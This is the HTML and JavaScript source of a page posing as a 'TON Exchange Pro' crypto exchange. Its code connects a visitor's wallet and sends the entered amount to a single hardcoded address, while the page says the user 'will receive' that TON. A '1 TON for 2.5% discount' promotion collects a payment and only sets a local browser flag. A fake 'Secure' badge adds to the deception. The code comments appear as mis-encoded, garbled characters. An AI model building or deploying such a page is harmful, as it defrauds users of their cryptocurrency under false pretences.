<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON Exchange Pro | Secure Crypto Exchange</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
    <style>
        /* –¢—É—Ç –≤–∞—à CSS –∫–æ–¥ —è–∫–∏–π –±—É–≤ —É —Ä–æ–±–æ—á—ñ–π –≤–µ—Ä—Å—ñ—ó */
        /* –°–ø—Ä–æ—â–µ–Ω–∏–π CSS –¥–ª—è –ø—Ä–∏–∫–ª–∞–¥—É - –≤—Å—Ç–∞–≤—Ç–µ –≤–∞—à –ø–æ–≤–Ω–∏–π CSS */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Inter', sans-serif; 
            background: #0f0f23; 
            color: #f8fafc; 
            min-height: 100vh; 
        }
        .navbar { background: #1a1a2e; padding: 1rem 0; border-bottom: 1px solid #334155; }
        .nav-container { max-width: 1200px; margin: 0 auto; padding: 0 2rem; display: flex; justify-content: space-between; align-items: center; }
        .exchange-card { background: #1a1a2e; border-radius: 16px; padding: 2rem; margin: 2rem auto; max-width: 500px; }
        .primary-button { background: #6366f1; color: white; border: none; padding: 1rem 2rem; border-radius: 8px; cursor: pointer; width: 100%; }
        .wallet-status { display: none; background: #252547; padding: 1rem; border-radius: 8px; margin: 1rem 0; }
    </style>
</head>
<body>
    <nav class="navbar">
        <div class="nav-container">
            <div class="nav-logo">
                <h2>TON Exchange Pro</h2>
            </div>
            <div class="nav-menu">
                <div id="tonconnect-button"></div>
            </div>
        </div>
    </nav>

    <main class="main-container">
        <div class="exchange-card">
            <div class="card-header">
                <h3>Create Payment</h3>
                <div class="security-badge">üîí Secure</div>
            </div>

            <div class="wallet-status" id="walletStatus">
                <div class="connected-wallet">
                    <span class="wallet-icon">üëõ</span>
                    <span class="wallet-address" id="connectedAddress"></span>
                    <button class="disconnect-btn" id="disconnectWallet">Disconnect</button>
                </div>
            </div>

            <div class="payment-form">
                <div class="form-group">
                    <label for="amount">Amount (USD)</label>
                    <input type="number" id="amount" class="form-input" placeholder="Enter amount" min="1" step="0.01">
                </div>

                <div class="form-group">
                    <label for="tonAmount">You will receive</label>
                    <input type="text" id="tonAmount" class="form-output" readonly>
                </div>

                <div class="promotion-banner">
                    <h4>üéâ Special Promotion!</h4>
                    <p>Pay 1 TON and get 2.5% discount on all future exchanges!</p>
                    <button class="promotion-button" id="promotionPayment">
                        Pay 1 TON - Get 2.5% Discount
                    </button>
                </div>

                <button id="createPayment" class="primary-button" disabled>
                    Connect Wallet to Continue
                </button>
            </div>
        </div>
    </main>

    <script>
        // –°–ø—Ä–æ—â–µ–Ω–∏–π –∫–æ–Ω—Ñ—ñ–≥
        const CONFIG = {
            RECIPIENT_TON_ADDRESS: "UQDYSduMmfE6sBBBhvTR1wGtTG0_hmsj_xRaIg7P_W6-Pv1y",
            EXCHANGE_RATE: 2.50,
            SERVICE_FEE: 0,
            MIN_AMOUNT: 10,
            MAX_AMOUNT_TON: 150
        };

        // –ü—Ä–æ—Å—Ç–∞ —ñ–Ω—ñ—Ü—ñ–∞–ª—ñ–∑–∞—Ü—ñ—è TON Connect
        let tonConnectUI = null;
        let currentAccount = null;

        async function initTONConnect() {
            try {
                // –í–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î–º–æ –ø—Ä–æ—Å—Ç–∏–π —Å–ø–æ—Å—ñ–± —ñ–Ω—ñ—Ü—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó
                tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
                    manifestUrl: window.location.origin + '/tonconnect-manifest.json',
                    buttonRootId: 'tonconnect-button'
                });

                // –ß–µ–∫–∞—î–º–æ –Ω–∞ –≤—ñ–¥–Ω–æ–≤–ª–µ–Ω–Ω—è –ø—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è
                const connectedWallets = await tonConnectUI.connectionRestored;
                if (connectedWallets) {
                    currentAccount = connectedWallets.account;
                    updateWalletDisplay();
                }

                // –°–ª—É—Ö–∞—î–º–æ –∑–º—ñ–Ω–∏ —Å—Ç–∞—Ç—É—Å—É
                tonConnectUI.onStatusChange((wallet) => {
                    console.log('Wallet status changed:', wallet);
                    currentAccount = wallet?.account || null;
                    updateWalletDisplay();
                });

            } catch (error) {
                console.error('TON Connect init error:', error);
            }
        }

        function updateWalletDisplay() {
            const walletStatus = document.getElementById('walletStatus');
            const connectedAddress = document.getElementById('connectedAddress');
            const createPaymentBtn = document.getElementById('createPayment');

            if (currentAccount) {
                const shortAddress = `${currentAccount.address.slice(0, 6)}...${currentAccount.address.slice(-6)}`;
                connectedAddress.textContent = shortAddress;
                walletStatus.style.display = 'block';
                createPaymentBtn.disabled = false;
                createPaymentBtn.textContent = 'Create Payment';
                console.log('Wallet connected:', currentAccount.address);
            } else {
                walletStatus.style.display = 'none';
                createPaymentBtn.disabled = true;
                createPaymentBtn.textContent = 'Connect Wallet to Continue';
            }
        }

        // –û–±—Ä–æ–±–∫–∞ –≤—ñ–¥–∫–ª—é—á–µ–Ω–Ω—è
        document.getElementById('disconnectWallet').addEventListener('click', async () => {
            if (tonConnectUI) {
                await tonConnectUI.disconnect();
                currentAccount = null;
                updateWalletDisplay();
            }
        });

        // –ê–∫—Ü—ñ–π–Ω–∞ –∫–Ω–æ–ø–∫–∞
        document.getElementById('promotionPayment').addEventListener('click', async () => {
            if (!currentAccount) {
                alert('Please connect wallet first');
                return;
            }
            
            try {
                const transaction = {
                    validUntil: Math.floor(Date.now() / 1000) + 600,
                    messages: [
                        {
                            address: CONFIG.RECIPIENT_TON_ADDRESS,
                            amount: (1 * 1000000000).toString(),
                            comment: 'Promotion: 1 TON for 2.5% discount'
                        }
                    ]
                };

                const result = await tonConnectUI.sendTransaction(transaction);
                if (result) {
                    localStorage.setItem('userDiscount', 'true');
                    alert('üéâ Promotion activated! You now have 2.5% discount on all future exchanges!');
                }
            } catch (error) {
                console.error('Promotion payment failed:', error);
            }
        });

        // –Ü–Ω—ñ—Ü—ñ–∞–ª—ñ–∑–∞—Ü—ñ—è –ø—Ä–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—ñ
        document.addEventListener('DOMContentLoaded', function() {
            initTONConnect();
            
            // –î–æ–¥–∞—î–º–æ –æ–±—Ä–æ–±–Ω–∏–∫ –¥–ª—è –æ—Å–Ω–æ–≤–Ω–æ—ó –∫–Ω–æ–ø–∫–∏ –ø–ª–∞—Ç–µ–∂—É
            document.getElementById('createPayment').addEventListener('click', async () => {
                if (!currentAccount) return;
                
                const usdAmount = parseFloat(document.getElementById('amount').value) || 0;
                if (usdAmount < CONFIG.MIN_AMOUNT) {
                    alert(`Minimum amount is $${CONFIG.MIN_AMOUNT}`);
                    return;
                }

                const tonAmount = usdAmount / CONFIG.EXCHANGE_RATE;
                if (tonAmount > CONFIG.MAX_AMOUNT_TON) {
                    alert(`Maximum amount is ${CONFIG.MAX_AMOUNT_TON} TON`);
                    return;
                }

                try {
                    const transaction = {
                        validUntil: Math.floor(Date.now() / 1000) + 600,
                        messages: [
                            {
                                address: CONFIG.RECIPIENT_TON_ADDRESS,
                                amount: (tonAmount * 1000000000).toString(),
                                comment: `Payment for $${usdAmount.toFixed(2)}`
                            }
                        ]
                    };

                    const result = await tonConnectUI.sendTransaction(transaction);
                    if (result) {
                        alert(`Payment successful! ${tonAmount.toFixed(6)} TON sent.`);
                    }
                } catch (error) {
                    console.error('Payment failed:', error);
                }
            });

            // –†–æ–∑—Ä–∞—Ö—É–Ω–æ–∫ —Å—É–º–∏
            document.getElementById('amount').addEventListener('input', function() {
                const usdAmount = parseFloat(this.value) || 0;
                const tonAmount = usdAmount / CONFIG.EXCHANGE_RATE;
                document.getElementById('tonAmount').value = tonAmount > 0 ? tonAmount.toFixed(6) + ' TON' : '';
            });
        });
    </script>
</body>
</html>
